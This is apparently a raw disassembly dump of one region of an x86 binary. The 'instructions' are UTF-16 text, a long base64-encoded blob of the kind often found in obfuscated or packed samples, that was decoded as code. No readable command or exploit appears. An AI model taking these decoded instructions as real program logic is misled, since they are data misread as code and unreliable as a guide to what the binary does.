  40b8e3:	5a                   	pop    %edx
  40b8e4:	00 35 00 54 00 32    	add    %dh,0x32005400
  40b8ea:	00 6e 00             	add    %ch,0x0(%esi)
  40b8ed:	63 00                	arpl   %eax,(%eax)
  40b8ef:	74 00                	je     0x40b8f1
  40b8f1:	31 00                	xor    %eax,(%eax)
  40b8f3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8f4:	00 58 00             	add    %bl,0x0(%eax)
  40b8f7:	77 00                	ja     0x40b8f9
  40b8f9:	61                   	popa
  40b8fa:	00 50 00             	add    %dl,0x0(%eax)
  40b8fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8fe:	00 62 00             	add    %ah,0x0(%edx)
  40b901:	34 00                	xor    $0x0,%al
  40b903:	6d                   	insl   (%dx),%es:(%edi)
  40b904:	00 35 00 59 00 4c    	add    %dh,0x4c005900
  40b90a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b90d:	53                   	push   %ebx
  40b90e:	00 70 00             	add    %dh,0x0(%eax)
  40b911:	6c                   	insb   (%dx),%es:(%edi)
  40b912:	00 4e 00             	add    %cl,0x0(%esi)
  40b915:	53                   	push   %ebx
  40b916:	00 67 00             	add    %ah,0x0(%edi)
  40b919:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40b91d:	52                   	push   %edx
  40b91e:	00 50 00             	add    %dl,0x0(%eax)
  40b921:	42                   	inc    %edx
  40b922:	00 47 00             	add    %al,0x0(%edi)
  40b925:	34 00                	xor    $0x0,%al
  40b927:	49                   	dec    %ecx
  40b928:	00 6e 00             	add    %ch,0x0(%esi)
  40b92b:	76 00                	jbe    0x40b92d
  40b92d:	58                   	pop    %eax
  40b92e:	00 4e 00             	add    %cl,0x0(%esi)
  40b931:	56                   	push   %esi
  40b932:	00 70 00             	add    %dh,0x0(%eax)
  40b935:	2f                   	das
  40b936:	00 57 00             	add    %dl,0x0(%edi)
  40b939:	4e                   	dec    %esi
  40b93a:	00 4f 00             	add    %cl,0x0(%edi)
  40b93d:	2f                   	das
  40b93e:	00 41 00             	add    %al,0x0(%ecx)
  40b941:	79 00                	jns    0x40b943
  40b943:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40b947:	43                   	inc    %ebx
  40b948:	00 77 00             	add    %dh,0x0(%edi)
  40b94b:	55                   	push   %ebp
  40b94c:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40b950:	00 42 00             	add    %al,0x0(%edx)
  40b953:	38 00                	cmp    %al,(%eax)
  40b955:	6f                   	outsl  %ds:(%esi),(%dx)
  40b956:	00 51 00             	add    %dl,0x0(%ecx)
  40b959:	33 00                	xor    (%eax),%eax
  40b95b:	4d                   	dec    %ebp
  40b95c:	00 4a 00             	add    %cl,0x0(%edx)
  40b95f:	44                   	inc    %esp
  40b960:	00 4d 00             	add    %cl,0x0(%ebp)
  40b963:	35 00 67 00 67       	xor    $0x67006700,%eax
  40b968:	00 57 00             	add    %dl,0x0(%edi)
  40b96b:	74 00                	je     0x40b96d
  40b96d:	59                   	pop    %ecx
  40b96e:	00 61 00             	add    %ah,0x0(%ecx)
  40b971:	63 00                	arpl   %eax,(%eax)
  40b973:	65 00 39             	add    %bh,%gs:(%ecx)
  40b976:	00 33                	add    %dh,(%ebx)
  40b978:	00 4f 00             	add    %cl,0x0(%edi)
  40b97b:	6a 00                	push   $0x0
  40b97d:	58                   	pop    %eax
  40b97e:	00 4f 00             	add    %cl,0x0(%edi)
  40b981:	74 00                	je     0x40b983
  40b983:	51                   	push   %ecx
  40b984:	00 79 00             	add    %bh,0x0(%ecx)
  40b987:	43                   	inc    %ebx
  40b988:	00 70 00             	add    %dh,0x0(%eax)
  40b98b:	31 00                	xor    %eax,(%eax)
  40b98d:	66 00 48 00          	data16 add %cl,0x0(%eax)
  40b991:	71 00                	jno    0x40b993
  40b993:	53                   	push   %ebx
  40b994:	00 46 00             	add    %al,0x0(%esi)
  40b997:	6d                   	insl   (%dx),%es:(%edi)
  40b998:	00 50 00             	add    %dl,0x0(%eax)
  40b99b:	4f                   	dec    %edi
  40b99c:	00 63 00             	add    %ah,0x0(%ebx)
  40b99f:	70 00                	jo     0x40b9a1
  40b9a1:	56                   	push   %esi
  40b9a2:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40b9a6:	00 4a 00             	add    %cl,0x0(%edx)
  40b9a9:	7a 00                	jp     0x40b9ab
  40b9ab:	6a 00                	push   $0x0
  40b9ad:	73 00                	jae    0x40b9af
  40b9af:	54                   	push   %esp
  40b9b0:	00 46 00             	add    %al,0x0(%esi)
  40b9b3:	37                   	aaa
  40b9b4:	00 47 00             	add    %al,0x0(%edi)
  40b9b7:	45                   	inc    %ebp
  40b9b8:	00 33                	add    %dh,(%ebx)
  40b9ba:	00 71 00             	add    %dh,0x0(%ecx)
  40b9bd:	43                   	inc    %ebx
  40b9be:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40b9c2:	00 71 00             	add    %dh,0x0(%ecx)
  40b9c5:	4f                   	dec    %edi
  40b9c6:	00 47 00             	add    %al,0x0(%edi)
  40b9c9:	45                   	inc    %ebp
  40b9ca:	00 30                	add    %dh,(%eax)
  40b9cc:	00 49 00             	add    %cl,0x0(%ecx)
  40b9cf:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40b9d3:	41                   	inc    %ecx
  40b9d4:	00 36                	add    %dh,(%esi)
  40b9d6:	00 49 00             	add    %cl,0x0(%ecx)
  40b9d9:	5a                   	pop    %edx
  40b9da:	00 78 00             	add    %bh,0x0(%eax)
  40b9dd:	74 00                	je     0x40b9df
  40b9df:	44                   	inc    %esp
  40b9e0:	00 58 00             	add    %bl,0x0(%eax)
  40b9e3:	4b                   	dec    %ebx
  40b9e4:	00 37                	add    %dh,(%edi)
  40b9e6:	00 33                	add    %dh,(%ebx)
  40b9e8:	00 55 00             	add    %dl,0x0(%ebp)
  40b9eb:	31 00                	xor    %eax,(%eax)
  40b9ed:	41                   	inc    %ecx
  40b9ee:	00 68 00             	add    %ch,0x0(%eax)
  40b9f1:	2f                   	das
  40b9f2:	00 6b 00             	add    %ch,0x0(%ebx)
  40b9f5:	67 00 45 00          	add    %al,0x0(%di)
  40b9f9:	6c                   	insb   (%dx),%es:(%edi)
  40b9fa:	00 6f 00             	add    %ch,0x0(%edi)
  40b9fd:	41                   	inc    %ecx
  40b9fe:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40ba02:	00 4f 00             	add    %cl,0x0(%edi)
  40ba05:	63 00                	arpl   %eax,(%eax)
  40ba07:	6a 00                	push   $0x0
  40ba09:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40ba0d:	56                   	push   %esi
  40ba0e:	00 6f 00             	add    %ch,0x0(%edi)
  40ba11:	54                   	push   %esp
  40ba12:	00 56 00             	add    %dl,0x0(%esi)
  40ba15:	6b 00 72             	imul   $0x72,(%eax),%eax
  40ba18:	00 5a 00             	add    %bl,0x0(%edx)
  40ba1b:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40ba1f:	5a                   	pop    %edx
  40ba20:	00 69 00             	add    %ch,0x0(%ecx)
  40ba23:	45                   	inc    %ebp
  40ba24:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40ba28:	00 39                	add    %bh,(%ecx)
  40ba2a:	00 6f 00             	add    %ch,0x0(%edi)
  40ba2d:	54                   	push   %esp
  40ba2e:	00 6b 00             	add    %ch,0x0(%ebx)
  40ba31:	38 00                	cmp    %al,(%eax)
  40ba33:	76 00                	jbe    0x40ba35
  40ba35:	71 00                	jno    0x40ba37
  40ba37:	59                   	pop    %ecx
  40ba38:	00 47 00             	add    %al,0x0(%edi)
  40ba3b:	45                   	inc    %ebp
  40ba3c:	00 35 00 34 00 77    	add    %dh,0x77003400
  40ba42:	00 71 00             	add    %dh,0x0(%ecx)
  40ba45:	61                   	popa
  40ba46:	00 71 00             	add    %dh,0x0(%ecx)
  40ba49:	66 00 6c 00 6a       	data16 add %ch,0x6a(%eax,%eax,1)
  40ba4e:	00 72 00             	add    %dh,0x0(%edx)
  40ba51:	73 00                	jae    0x40ba53
  40ba53:	42                   	inc    %edx
  40ba54:	00 33                	add    %dh,(%ebx)
  40ba56:	00 78 00             	add    %bh,0x0(%eax)
  40ba59:	53                   	push   %ebx
  40ba5a:	00 36                	add    %dh,(%esi)
  40ba5c:	00 69 00             	add    %ch,0x0(%ecx)
  40ba5f:	43                   	inc    %ebx
  40ba60:	00 50 00             	add    %dl,0x0(%eax)
  40ba63:	73 00                	jae    0x40ba65
  40ba65:	30 00                	xor    %al,(%eax)
  40ba67:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba68:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40ba6c:	00 33                	add    %dh,(%ebx)
  40ba6e:	00 43 00             	add    %al,0x0(%ebx)
  40ba71:	74 00                	je     0x40ba73
  40ba73:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40ba77:	33 00                	xor    (%eax),%eax
  40ba79:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40ba7d:	37                   	aaa
  40ba7e:	00 51 00             	add    %dl,0x0(%ecx)
  40ba81:	6b 00 54             	imul   $0x54,(%eax),%eax
  40ba84:	00 50 00             	add    %dl,0x0(%eax)
  40ba87:	4f                   	dec    %edi
  40ba88:	00 51 00             	add    %dl,0x0(%ecx)
  40ba8b:	5a                   	pop    %edx
  40ba8c:	00 41 00             	add    %al,0x0(%ecx)
  40ba8f:	42                   	inc    %edx
  40ba90:	00 52 00             	add    %dl,0x0(%edx)
  40ba93:	69 00 53 00 39 00    	imul   $0x390053,(%eax),%eax
  40ba99:	57                   	push   %edi
  40ba9a:	00 43 00             	add    %al,0x0(%ebx)
  40ba9d:	42                   	inc    %edx
  40ba9e:	00 32                	add    %dh,(%edx)
  40baa0:	00 38                	add    %bh,(%eax)
  40baa2:	00 47 00             	add    %al,0x0(%edi)
  40baa5:	50                   	push   %eax
  40baa6:	00 5a 00             	add    %bl,0x0(%edx)
  40baa9:	4e                   	dec    %esi
  40baaa:	00 62 00             	add    %ah,0x0(%edx)
  40baad:	52                   	push   %edx
  40baae:	00 39                	add    %bh,(%ecx)
  40bab0:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40bab4:	00 31                	add    %dh,(%ecx)
  40bab6:	00 4a 00             	add    %cl,0x0(%edx)
  40bab9:	50                   	push   %eax
  40baba:	00 39                	add    %bh,(%ecx)
  40babc:	00 69 00             	add    %ch,0x0(%ecx)
  40babf:	43                   	inc    %ebx
  40bac0:	00 79 00             	add    %bh,0x0(%ecx)
  40bac3:	70 00                	jo     0x40bac5
  40bac5:	70 00                	jo     0x40bac7
  40bac7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bac8:	00 61 00             	add    %ah,0x0(%ecx)
  40bacb:	4e                   	dec    %esi
  40bacc:	00 78 00             	add    %bh,0x0(%eax)
  40bacf:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40bad3:	59                   	pop    %ecx
  40bad4:	00 56 00             	add    %dl,0x0(%esi)
  40bad7:	57                   	push   %edi
  40bad8:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40badc:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40bae0:	00 76 00             	add    %dh,0x0(%esi)
  40bae3:	47                   	inc    %edi
  40bae4:	00 62 00             	add    %ah,0x0(%edx)
  40bae7:	72 00                	jb     0x40bae9
  40bae9:	2b 00                	sub    (%eax),%eax
  40baeb:	67 00 46 00          	add    %al,0x0(%bp)
  40baef:	31 00                	xor    %eax,(%eax)
  40baf1:	48                   	dec    %eax
  40baf2:	00 42 00             	add    %al,0x0(%edx)
  40baf5:	54                   	push   %esp
  40baf6:	00 6d 00             	add    %ch,0x0(%ebp)
  40baf9:	75 00                	jne    0x40bafb
  40bafb:	4e                   	dec    %esi
  40bafc:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  40bb00:	00 4b 00             	add    %cl,0x0(%ebx)
  40bb03:	32 00                	xor    (%eax),%al
  40bb05:	63 00                	arpl   %eax,(%eax)
  40bb07:	71 00                	jno    0x40bb09
  40bb09:	34 00                	xor    $0x0,%al
  40bb0b:	68 00 42 00 66       	push   $0x66004200
  40bb10:	00 4a 00             	add    %cl,0x0(%edx)
  40bb13:	69 00 2f 00 6d 00    	imul   $0x6d002f,(%eax),%eax
  40bb19:	53                   	push   %ebx
  40bb1a:	00 4b 00             	add    %cl,0x0(%ebx)
  40bb1d:	39 00                	cmp    %eax,(%eax)
  40bb1f:	74 00                	je     0x40bb21
  40bb21:	4c                   	dec    %esp
  40bb22:	00 45 00             	add    %al,0x0(%ebp)
  40bb25:	74 00                	je     0x40bb27
  40bb27:	52                   	push   %edx
  40bb28:	00 6a 00             	add    %ch,0x0(%edx)
  40bb2b:	78 00                	js     0x40bb2d
  40bb2d:	43                   	inc    %ebx
  40bb2e:	00 52 00             	add    %dl,0x0(%edx)
  40bb31:	50                   	push   %eax
  40bb32:	00 75 00             	add    %dh,0x0(%ebp)
  40bb35:	69 00 47 00 77 00    	imul   $0x770047,(%eax),%eax
  40bb3b:	79 00                	jns    0x40bb3d
  40bb3d:	78 00                	js     0x40bb3f
  40bb3f:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40bb43:	71 00                	jno    0x40bb45
  40bb45:	4f                   	dec    %edi
  40bb46:	00 4a 00             	add    %cl,0x0(%edx)
  40bb49:	51                   	push   %ecx
  40bb4a:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  40bb4e:	00 30                	add    %dh,(%eax)
  40bb50:	00 41 00             	add    %al,0x0(%ecx)
  40bb53:	63 00                	arpl   %eax,(%eax)
  40bb55:	57                   	push   %edi
  40bb56:	00 4a 00             	add    %cl,0x0(%edx)
  40bb59:	50                   	push   %eax
  40bb5a:	00 68 00             	add    %ch,0x0(%eax)
  40bb5d:	63 00                	arpl   %eax,(%eax)
  40bb5f:	47                   	inc    %edi
  40bb60:	00 31                	add    %dh,(%ecx)
  40bb62:	00 6a 00             	add    %ch,0x0(%edx)
  40bb65:	79 00                	jns    0x40bb67
  40bb67:	31 00                	xor    %eax,(%eax)
  40bb69:	57                   	push   %edi
  40bb6a:	00 69 00             	add    %ch,0x0(%ecx)
  40bb6d:	41                   	inc    %ecx
  40bb6e:	00 65 00             	add    %ah,0x0(%ebp)
  40bb71:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40bb75:	41                   	inc    %ecx
  40bb76:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb79:	73 00                	jae    0x40bb7b
  40bb7b:	61                   	popa
  40bb7c:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb7f:	67 00 54 00          	add    %dl,0x0(%si)
  40bb83:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb84:	00 57 00             	add    %dl,0x0(%edi)
  40bb87:	59                   	pop    %ecx
  40bb88:	00 63 00             	add    %ah,0x0(%ebx)
  40bb8b:	36 00 39             	add    %bh,%ss:(%ecx)
  40bb8e:	00 72 00             	add    %dh,0x0(%edx)
  40bb91:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb92:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40bb96:	00 2b                	add    %ch,(%ebx)
  40bb98:	00 53 00             	add    %dl,0x0(%ebx)
  40bb9b:	46                   	inc    %esi
  40bb9c:	00 66 00             	add    %ah,0x0(%esi)
  40bb9f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bba0:	00 6a 00             	add    %ch,0x0(%edx)
  40bba3:	4a                   	dec    %edx
  40bba4:	00 43 00             	add    %al,0x0(%ebx)
  40bba7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bba8:	00 47 00             	add    %al,0x0(%edi)
  40bbab:	37                   	aaa
  40bbac:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40bbb0:	00 5a 00             	add    %bl,0x0(%edx)
  40bbb3:	31 00                	xor    %eax,(%eax)
  40bbb5:	43                   	inc    %ebx
  40bbb6:	00 43 00             	add    %al,0x0(%ebx)
  40bbb9:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40bbbd:	73 00                	jae    0x40bbbf
  40bbbf:	70 00                	jo     0x40bbc1
  40bbc1:	53                   	push   %ebx
  40bbc2:	00 59 00             	add    %bl,0x0(%ecx)
  40bbc5:	61                   	popa
  40bbc6:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40bbca:	00 48 00             	add    %cl,0x0(%eax)
  40bbcd:	48                   	dec    %eax
  40bbce:	00 78 00             	add    %bh,0x0(%eax)
  40bbd1:	48                   	dec    %eax
  40bbd2:	00 57 00             	add    %dl,0x0(%edi)
  40bbd5:	4c                   	dec    %esp
  40bbd6:	00 78 00             	add    %bh,0x0(%eax)
  40bbd9:	47                   	inc    %edi
  40bbda:	00 55 00             	add    %dl,0x0(%ebp)
  40bbdd:	4b                   	dec    %ebx
  40bbde:	00 2b                	add    %ch,(%ebx)
  40bbe0:	00 49 00             	add    %cl,0x0(%ecx)
  40bbe3:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40bbe7:	7a 00                	jp     0x40bbe9
  40bbe9:	74 00                	je     0x40bbeb
  40bbeb:	63 00                	arpl   %eax,(%eax)
  40bbed:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40bbf1:	30 00                	xor    %al,(%eax)
  40bbf3:	63 00                	arpl   %eax,(%eax)
  40bbf5:	2f                   	das
  40bbf6:	00 76 00             	add    %dh,0x0(%esi)
  40bbf9:	33 00                	xor    (%eax),%eax
  40bbfb:	68 00 59 00 2f       	push   $0x2f005900
  40bc00:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  40bc04:	00 77 00             	add    %dh,0x0(%edi)
  40bc07:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bc0b:	44                   	inc    %esp
  40bc0c:	00 30                	add    %dh,(%eax)
  40bc0e:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40bc12:	00 59 00             	add    %bl,0x0(%ecx)
  40bc15:	45                   	inc    %ebp
  40bc16:	00 6b 00             	add    %ch,0x0(%ebx)
  40bc19:	41                   	inc    %ecx
  40bc1a:	00 5a 00             	add    %bl,0x0(%edx)
  40bc1d:	4b                   	dec    %ebx
  40bc1e:	00 2f                	add    %ch,(%edi)
  40bc20:	00 62 00             	add    %ah,0x0(%edx)
  40bc23:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc24:	00 43 00             	add    %al,0x0(%ebx)
  40bc27:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40bc2b:	5a                   	pop    %edx
  40bc2c:	00 51 00             	add    %dl,0x0(%ecx)
  40bc2f:	61                   	popa
  40bc30:	00 46 00             	add    %al,0x0(%esi)
  40bc33:	59                   	pop    %ecx
  40bc34:	00 78 00             	add    %bh,0x0(%eax)
  40bc37:	2f                   	das
  40bc38:	00 58 00             	add    %bl,0x0(%eax)
  40bc3b:	62 00                	bound  %eax,(%eax)
  40bc3d:	46                   	inc    %esi
  40bc3e:	00 37                	add    %dh,(%edi)
  40bc40:	00 69 00             	add    %ch,0x0(%ecx)
  40bc43:	39 00                	cmp    %eax,(%eax)
  40bc45:	6c                   	insb   (%dx),%es:(%edi)
  40bc46:	00 66 00             	add    %ah,0x0(%esi)
  40bc49:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40bc4d:	68 00 34 00 6d       	push   $0x6d003400
  40bc52:	00 4f 00             	add    %cl,0x0(%edi)
  40bc55:	32 00                	xor    (%eax),%al
  40bc57:	76 00                	jbe    0x40bc59
  40bc59:	70 00                	jo     0x40bc5b
  40bc5b:	59                   	pop    %ecx
  40bc5c:	00 77 00             	add    %dh,0x0(%edi)
  40bc5f:	41                   	inc    %ecx
  40bc60:	00 75 00             	add    %dh,0x0(%ebp)
  40bc63:	79 00                	jns    0x40bc65
  40bc65:	6b 00 32             	imul   $0x32,(%eax),%eax
  40bc68:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40bc6c:	00 45 00             	add    %al,0x0(%ebp)
  40bc6f:	37                   	aaa
  40bc70:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc73:	61                   	popa
  40bc74:	00 59 00             	add    %bl,0x0(%ecx)
  40bc77:	31 00                	xor    %eax,(%eax)
  40bc79:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc7a:	00 59 00             	add    %bl,0x0(%ecx)
  40bc7d:	2b 00                	sub    (%eax),%eax
  40bc7f:	4f                   	dec    %edi
  40bc80:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40bc84:	00 32                	add    %dh,(%edx)
  40bc86:	00 63 00             	add    %ah,0x0(%ebx)
  40bc89:	7a 00                	jp     0x40bc8b
  40bc8b:	71 00                	jno    0x40bc8d
  40bc8d:	72 00                	jb     0x40bc8f
  40bc8f:	46                   	inc    %esi
  40bc90:	00 48 00             	add    %cl,0x0(%eax)
  40bc93:	61                   	popa
  40bc94:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bc98:	00 69 00             	add    %ch,0x0(%ecx)
  40bc9b:	56                   	push   %esi
  40bc9c:	00 30                	add    %dh,(%eax)
  40bc9e:	00 2f                	add    %ch,(%edi)
  40bca0:	00 62 00             	add    %ah,0x0(%edx)
  40bca3:	2f                   	das
  40bca4:	00 63 00             	add    %ah,0x0(%ebx)
  40bca7:	70 00                	jo     0x40bca9
  40bca9:	41                   	inc    %ecx
  40bcaa:	00 61 00             	add    %ah,0x0(%ecx)
  40bcad:	41                   	inc    %ecx
  40bcae:	00 77 00             	add    %dh,0x0(%edi)
  40bcb1:	4e                   	dec    %esi
  40bcb2:	00 4a 00             	add    %cl,0x0(%edx)
  40bcb5:	51                   	push   %ecx
  40bcb6:	00 31                	add    %dh,(%ecx)
  40bcb8:	00 76 00             	add    %dh,0x0(%esi)
  40bcbb:	46                   	inc    %esi
  40bcbc:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40bcc0:	00 65 00             	add    %ah,0x0(%ebp)
  40bcc3:	79 00                	jns    0x40bcc5
  40bcc5:	78 00                	js     0x40bcc7
  40bcc7:	4e                   	dec    %esi
  40bcc8:	00 7a 00             	add    %bh,0x0(%edx)
  40bccb:	72 00                	jb     0x40bccd
  40bccd:	2b 00                	sub    (%eax),%eax
  40bccf:	42                   	inc    %edx
  40bcd0:	00 6b 00             	add    %ch,0x0(%ebx)
  40bcd3:	59                   	pop    %ecx
  40bcd4:	00 30                	add    %dh,(%eax)
  40bcd6:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcd9:	7a 00                	jp     0x40bcdb
  40bcdb:	37                   	aaa
  40bcdc:	00 6b 00             	add    %ch,0x0(%ebx)
  40bcdf:	6f                   	outsl  %ds:(%esi),(%dx)
  40bce0:	00 72 00             	add    %dh,0x0(%edx)
  40bce3:	62 00                	bound  %eax,(%eax)
  40bce5:	4c                   	dec    %esp
  40bce6:	00 79 00             	add    %bh,0x0(%ecx)
  40bce9:	4c                   	dec    %esp
  40bcea:	00 6d 00             	add    %ch,0x0(%ebp)
  40bced:	54                   	push   %esp
  40bcee:	00 76 00             	add    %dh,0x0(%esi)
  40bcf1:	30 00                	xor    %al,(%eax)
  40bcf3:	4a                   	dec    %edx
  40bcf4:	00 50 00             	add    %dl,0x0(%eax)
  40bcf7:	58                   	pop    %eax
  40bcf8:	00 41 00             	add    %al,0x0(%ecx)
  40bcfb:	5a                   	pop    %edx
  40bcfc:	00 71 00             	add    %dh,0x0(%ecx)
  40bcff:	68 00 51 00 72       	push   $0x72005100
  40bd04:	00 6f 00             	add    %ch,0x0(%edi)
  40bd07:	48                   	dec    %eax
  40bd08:	00 47 00             	add    %al,0x0(%edi)
  40bd0b:	6a 00                	push   $0x0
  40bd0d:	63 00                	arpl   %eax,(%eax)
  40bd0f:	79 00                	jns    0x40bd11
  40bd11:	2f                   	das
  40bd12:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40bd16:	00 39                	add    %bh,(%ecx)
  40bd18:	00 6f 00             	add    %ch,0x0(%edi)
  40bd1b:	46                   	inc    %esi
  40bd1c:	00 49 00             	add    %cl,0x0(%ecx)
  40bd1f:	4a                   	dec    %edx
  40bd20:	00 33                	add    %dh,(%ebx)
  40bd22:	00 31                	add    %dh,(%ecx)
  40bd24:	00 65 00             	add    %ah,0x0(%ebp)
  40bd27:	7a 00                	jp     0x40bd29
  40bd29:	79 00                	jns    0x40bd2b
  40bd2b:	65 00 4c 00 4f       	add    %cl,%gs:0x4f(%eax,%eax,1)
  40bd30:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40bd34:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bd38:	00 6e 00             	add    %ch,0x0(%esi)
  40bd3b:	55                   	push   %ebp
  40bd3c:	00 31                	add    %dh,(%ecx)
  40bd3e:	00 38                	add    %bh,(%eax)
  40bd40:	00 36                	add    %dh,(%esi)
  40bd42:	00 37                	add    %dh,(%edi)
  40bd44:	00 31                	add    %dh,(%ecx)
  40bd46:	00 59 00             	add    %bl,0x0(%ecx)
  40bd49:	76 00                	jbe    0x40bd4b
  40bd4b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd4c:	00 48 00             	add    %cl,0x0(%eax)
  40bd4f:	73 00                	jae    0x40bd51
  40bd51:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40bd55:	30 00                	xor    %al,(%eax)
  40bd57:	47                   	inc    %edi
  40bd58:	00 66 00             	add    %ah,0x0(%esi)
  40bd5b:	72 00                	jb     0x40bd5d
  40bd5d:	30 00                	xor    %al,(%eax)
  40bd5f:	5a                   	pop    %edx
  40bd60:	00 79 00             	add    %bh,0x0(%ecx)
  40bd63:	79 00                	jns    0x40bd65
  40bd65:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  40bd69:	6c                   	insb   (%dx),%es:(%edi)
  40bd6a:	00 47 00             	add    %al,0x0(%edi)
  40bd6d:	69 00 6f 00 54 00    	imul   $0x54006f,(%eax),%eax
  40bd73:	36 00 54 00 41       	add    %dl,%ss:0x41(%eax,%eax,1)
  40bd78:	00 66 00             	add    %ah,0x0(%esi)
  40bd7b:	64 00 35 00 37 00 58 	add    %dh,%fs:0x58003700
  40bd82:	00 53 00             	add    %dl,0x0(%ebx)
  40bd85:	62 00                	bound  %eax,(%eax)
  40bd87:	71 00                	jno    0x40bd89
  40bd89:	71 00                	jno    0x40bd8b
  40bd8b:	78 00                	js     0x40bd8d
  40bd8d:	55                   	push   %ebp
  40bd8e:	00 52 00             	add    %dl,0x0(%edx)
  40bd91:	56                   	push   %esi
  40bd92:	00 32                	add    %dh,(%edx)
  40bd94:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40bd98:	00 51 00             	add    %dl,0x0(%ecx)
  40bd9b:	50                   	push   %eax
  40bd9c:	00 4a 00             	add    %cl,0x0(%edx)
  40bd9f:	6a 00                	push   $0x0
  40bda1:	37                   	aaa
  40bda2:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40bda6:	00 2f                	add    %ch,(%edi)
  40bda8:	00 2f                	add    %ch,(%edi)
  40bdaa:	00 72 00             	add    %dh,0x0(%edx)
  40bdad:	57                   	push   %edi
  40bdae:	00 33                	add    %dh,(%ebx)
  40bdb0:	00 37                	add    %dh,(%edi)
  40bdb2:	00 31                	add    %dh,(%ecx)
  40bdb4:	00 37                	add    %dh,(%edi)
  40bdb6:	00 49 00             	add    %cl,0x0(%ecx)
  40bdb9:	4c                   	dec    %esp
  40bdba:	00 41 00             	add    %al,0x0(%ecx)
  40bdbd:	37                   	aaa
  40bdbe:	00 59 00             	add    %bl,0x0(%ecx)
  40bdc1:	32 00                	xor    (%eax),%al
  40bdc3:	30 00                	xor    %al,(%eax)
  40bdc5:	71 00                	jno    0x40bdc7
  40bdc7:	4e                   	dec    %esi
  40bdc8:	00 37                	add    %dh,(%edi)
  40bdca:	00 7a 00             	add    %bh,0x0(%edx)
  40bdcd:	61                   	popa
  40bdce:	00 78 00             	add    %bh,0x0(%eax)
  40bdd1:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40bdd5:	74 00                	je     0x40bdd7
  40bdd7:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40bddb:	54                   	push   %esp
  40bddc:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40bde0:	00 45 00             	add    %al,0x0(%ebp)
  40bde3:	58                   	pop    %eax
  40bde4:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40bde8:	00 38                	add    %bh,(%eax)
  40bdea:	00 50 00             	add    %dl,0x0(%eax)
  40bded:	37                   	aaa
  40bdee:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40bdf2:	00 59 00             	add    %bl,0x0(%ecx)
  40bdf5:	35 00 74 00 31       	xor    $0x31007400,%eax
  40bdfa:	00 75 00             	add    %dh,0x0(%ebp)
  40bdfd:	2f                   	das
  40bdfe:	00 6f 00             	add    %ch,0x0(%edi)
  40be01:	47                   	inc    %edi
  40be02:	00 56 00             	add    %dl,0x0(%esi)
  40be05:	30 00                	xor    %al,(%eax)
  40be07:	66 00 56 00          	data16 add %dl,0x0(%esi)
  40be0b:	78 00                	js     0x40be0d
  40be0d:	68 00 55 00 66       	push   $0x66005500
  40be12:	00 41 00             	add    %al,0x0(%ecx)
  40be15:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40be1a:	80 b1 45 00 74 00 66 	xorb   $0x66,0x740045(%ecx)
  40be21:	00 72 00             	add    %dh,0x0(%edx)
  40be24:	79 00                	jns    0x40be26
